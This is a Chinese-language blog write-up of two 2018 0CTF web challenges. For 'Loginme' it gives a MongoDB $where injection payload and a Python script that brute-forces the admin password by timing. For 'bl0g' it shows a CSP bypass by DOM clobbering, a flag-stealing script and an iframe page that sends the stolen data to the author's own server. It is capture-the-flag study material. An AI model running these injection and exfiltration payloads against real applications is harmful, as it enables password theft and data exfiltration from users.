---
title: 2018 0ctf-部分writeup
url: 282.html
id: 282
categories:
  - CTF
date: 2018-04-10 19:04:39
tags:
---

# 前言

这星期补了下js、nodejs基础，决定回过头来再看一下这些题 每个都是看了很久才看懂具体在操作什么 所以，讲熟练掌握这个技巧了是不太可能，只能做下记录  

# Loginme

先贴一下源码，加粗一下个人认为最重要的一个代码块
``` JavaScript
    var express = require('express')
    var app = express()
    
    var bodyParser = require('body-parser')
    app.use(bodyParser.urlencoded({}));
    
    var path    = require("path");
    var moment = require('moment');
    var MongoClient = require('mongodb').MongoClient;
    var url = "mongodb://localhost:27017/";
    
    MongoClient.connect(url, function(err, db) {
        if (err) throw err;
        dbo = db.db("test_db");
        var collection_name = "users";
        var password_column = "password_"+Math.random().toString(36).slice(2)
        var password = "XXXXXXXXXXXXXXXXXXXXXX";
        // flag is flag{password}
        var myobj = { "username": "admin", "last_access": moment().format('YYYY-MM-DD HH:mm:ss Z')};
        myobj[password_column] = password;
        dbo.collection(collection_name).remove({});
        dbo.collection(collection_name).update(
            { name: myobj.name },
            myobj,
            { upsert: true }
        );
    
        app.get('/', function (req, res) {
            res.sendFile(path.join(__dirname,'index.html'));
        })
        app.post('/check', function (req, res) {
            var check_function = 'if(this.username == #username# && #username# == "admin" && hex_md5(#password#) == this.'+password_column+'){\nreturn 1;\n}else{\nreturn 0;}';
    
            for(var k in req.body){
                var valid = ['#','(',')'].every((x)=>{return req.body[k].indexOf(x) == -1});
                if(!valid) res.send('Nope');
                check_function = check_function.replace(
                    new RegExp('#'+k+'#','gm')
                    ,JSON.stringify(req.body[k]))
            }
            var query = {"$where" : check_function};
            var newvalue = {$set : {last_access: moment().format('YYYY-MM-DD HH:mm:ss Z')}}
            dbo.collection(collection_name).updateOne(query,newvalue,function (e,r){
                if(e) throw e;
                res.send('ok');
                // ... implementing, plz dont release this.
            });
        })
        app.listen(8081)
    
    });
```

讲一下大体代码流程：
```
对传入的post键值对（key:value）进行处理
对每一个value进行检测，不允许存在 '('、')'、'#' 这几字符
再进行一次 replace( new RegExp('#'+k+'#','gm') ,JSON.stringify(req.body[k])) }  的替换
```
有几个代码注入的重要点在于

*   传入的post数据可以不是username和password
*   可以利用 | 的方式隔开 #，构成正则的或判断符
*   利用js的弱类型，传入数组，绕过（）的检测

还是直接上payload把，感觉讲起来有点绕，直接看输出结果可能更容易理解
```
**|=**&**|this.*word""\)|[]=+'X'+**&**|1;|[]=+sleep(300)+**&**|(this.password_\w+)|[]=+$1.substr(0,1)+**&**|"|=**
```
帮助理解的一些输出语句
```
match part :#,#,#,#,#,#                    //  **|=**   替换掉所有的#,防止
正在替换：| -----> 
query: if(this.username == ""username"" && ""username"" == "admin" && hex_md5(""password"") == this.password_0ugfcbsrbms){return 1;}else{return 0;}

match part :this.username == ""username"" && ""username"" == "admin" && hex_md5(""password"")
正在替换：|this.*word""\)| -----> +'X'+   // **|this.*word""\)|[]=+'X'+**    替换掉前面多余的字符串
query: if("+'X'+" == this.password_0ugfcbsrbms){return 1;}else{return 0;}

match part :1;
正在替换：|1;| -----> +sleep(3000)+       //**|1;|[]=+sleep(300)+**    传入延时函数，以数组形式绕过（）检测
query: if("+'X'+" == this.password_0ugfcbsrbms){return ["+sleep(3000)+"]}else{return 0;}

match part :this.password_0ugfcbsrbms
正在替换：|(this.password_\w+)| -----> +$1.substr(0,1)+ //**|(this.password_\w+)|[]=+$1.substr(0,1)+ 截断字符，单个比较**
query: if("+'X'+" == ["+this.password_0ugfcbsrbms.substr(0,1)+"]){return ["+sleep(3000)+"]}else{return 0;}

match part :",",",",","
正在替换：|"| ----->                   //  **|"|=** 将单个引号变成成对的双引号空字符
query: if(""+'X'+"" == [""+this.password_0ugfcbsrbms.substr(0,1)+""]){return [""+sleep(3000)+""]}else{return 0;}
```
然后爆破的字节位置以及猜测的字符串和延时长度都以及被控制了，剩下的写个脚本跑就好了
```python
    #encoding=utf8
    import requests, string, time
    
    url = "http://202.120.7.194:8081/check"
    char_range = string.printable
    #base_payload = '''|=&|this.*word""\)|=+'{}'+&|1;|[]=+sleep(1500)+&|(this.password_\w+)|[]=+$1.substr({},1)+&|"|='''
    
    char_list = []
    for char_len in range(30):
    	for char in list(char_range):
    		x = "+'{}'+".format(char)
    		y = '+$1.substr({},1)+'.format(char_len)
    		data = {'|':'','|this.*word""\)|':x,'|1;|[]':'+sleep(1000)+','|(this.password_\w+)|[]':y,'|"|':''}
    		#print(data)
    		start_time = time.time()
    		r = requests.post(url, data = data)
    		end_time = time.time()
    		if end_time - start_time>1:
    			char_list.append(char)
    			print(''.join(char_list))
    			break
    
    flag{13fc892df79a86494792e14dcbef25}
```

# bl0g 
题目进去是个留言板系统，可以提交留言，flag只有管理员能看到，也有提交页面url的链接，所以还是一道xss的题目 
题目的SCP规则
```
Content-Security-Policy:
script-src 'self' 'unsafe-inline'

Content-Security-Policy:
default-src 'none'; script-src 'nonce-hAovzHMfA+dpxVdTXRzpZq72Fjs=' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; media-src 'self'; font-src 'self' data:; connect-src 'self'; base-uri 'none
```
一开始不熟悉SCP，一直在想着怎么绕过SCP 
插一个题外话——**常规绕过SCP的方式** 就比如利用浏览器的容错性
在一个script标签之前插入一个`<script name="`的代码块，吃掉后面script标签的nonce的token
```
<script name="
<script nonce="scptoken"></script>
```
浏览器的容错性会让其解释为
```
<script name="<script" nonce="scptoken"></script>
```
从而吃掉别人的标签 这里在提交留言的地方有三个参数 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/3973fee3a7fb3fbf5b940f4c30e31239.png) 
title和content字段都进行的html编码暂时无法逃逸 还有一个effect特效标签，没有进行编码，可以导致用户插入代码 
但插入的代码依旧收到scp的限制无法执行 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/acd8e5e3eb2cf713a059e0e6da520045.png) 
这里允许插入文本的标签附近并没有其他script标签，js遇到无法解析的语法时就不会继续执行，所以之前的方法暂时也行不通 在这里，主要关注到两个js文件 config.js
```javascript
    var effects = {
        'nest': [
            '<script src="/assets/js/effects/canvas-nest.min.js"></script>'
        ],
        '3waves': [
            '<script src="/assets/js/effects/three.min.js"></script>',
            '<script src="/assets/js/effects/three-waves.min.js"></script>'
        ],
        'lines': [
           '<script src="/assets/js/effects/three.min.js"></script>',
           '<script src="/assets/js/effects/canvas-lines.min.js"></script>'
        ],
        'sphere': [
           '<script src="/assets/js/effects/three.min.js"></script>',
           '<script src="/assets/js/effects/canvas-sphere.min.js"></script>'
        ],
    }
    

article.js

    $(document).ready(function(){
        $("body").append((effects[$("#effect").val()]));
    });
```
article.js通过找到id为effect的标签，选取其中的值，进而从config.js中选取对应的js文件加载到html中 这里有个重要的trick

> 在js中，对于特定的form,iframe,applet,embed,object,img标签，我们可以通过设置id或者name来使得通过id或name获取标签

意思是指，当html中存在一个`<form id="my_form">`时，可以直接通过my_form来获取这个标签， 验证一下：可以看到，确实是可以通过id直接获取到改fomr节点 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/102f88d55fd6426f1dbb4a9d580d82ef.png) 
所以，接下来的思路就是通过控制article中的append的节点，插入至恶意代码 要做的有如下两件事

1.  注释掉config.js，否则无法控制想要的append节点的字符
2.  找一个可以存放恶意代码，又可以通过effects\[$("#effect").val()\] 方式取出的节点

看看大佬们是如何操作的
```
effect=name"><form id=effects name="<script>alert(1)</script>"><script>
```
看看效果 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/8c3d11c08a0e73469c9136f1722990ee.png) 
成功弹窗，分析下页面html 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/2ee0083a1d05f66f96c4316acb7e7c50.png) 
最后的`<script>`与config.js的`</script>`进行了闭合 而且代码的最后，插入了`<script>alert(1)</script>`的弹窗代码 分析下，插入代码的过程 查看下每个变量的值 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/3c28981161447502b7ac10766c4b2de1.png) 
effects由于注释了config.js之后，又重新创建了一个id为effetcs的form 导致effects直接选出来的就是我们构造的form标签 $('#effect')  
则是通过我们代码最开头给effect标签的value设置了一个name，导致其值也变成了name 
这样组合下来 effects\[$("#effect").val()\]  就变成了我们设置的那个form中name的值，而这个点恰好又是我们能控制的 从而产生了弹窗 

接下来在引入两个问题

*   effect字符的输入有长度限制
*   如何通过js获取flag的值，并发送给自己

提供一个别人的js
```html
<script>$.get('/flag',e=>name=e)
```
通过jquery，发送一个get请求，并将请求的值返回给window.name 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/5e280e64b80986c150c6187c3ebbe934.png) 
根据window.name可以跨域传输的性质，接下来还一个任意转跳的链接
```
202.120.7.197:8090/login?next=%2F
```
通过修改next参数，可以跳转到任意链接 这样提交恶意url的时候，就可以指向自己构造的一个页面，然后切入iframe标签，获取window.name
```html
<iframe src="http://202.120.7.197:8090/article/3816"></iframe>
<script>
 setTimeout(()=>{frames[0].window.location.href='/'},1200)
 setTimeout(()=>{location.href='http://xss.kingkk.com/?'+frames[0].window.name},1500)
</script>
```
就获取了iframe标签中的window.name，并发送往自己的服务器，可在log文件中查看flag 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/759253fc33fc0de9311fd06e79ec08f2.png) 
将指定链接发给xssbot即可获得flag